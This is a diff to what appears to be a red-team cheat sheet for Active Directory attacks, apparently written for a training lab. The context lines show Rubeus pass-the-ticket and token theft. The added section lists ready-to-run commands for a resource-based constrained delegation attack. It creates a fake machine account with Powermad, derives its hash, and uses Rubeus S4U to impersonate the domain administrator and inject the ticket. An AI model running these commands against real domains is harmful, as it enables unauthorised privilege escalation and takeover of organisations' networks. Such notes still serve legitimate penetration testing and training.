@@ -53,5 +53,18 @@ execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x239b995 /ticket:[...snip
 steal_token 3420
 ls \\fs-1.cyberbotic.io\c$
 ```
+### Resource-based Constrained Delegation
+```
+Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
 
+import-module powermad
+
+New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+Get-DomainComputer FAKECOMPUTER #Check if created if you have powerview
+
+.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER /domain:domain.local
+
+rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
+
+```
 
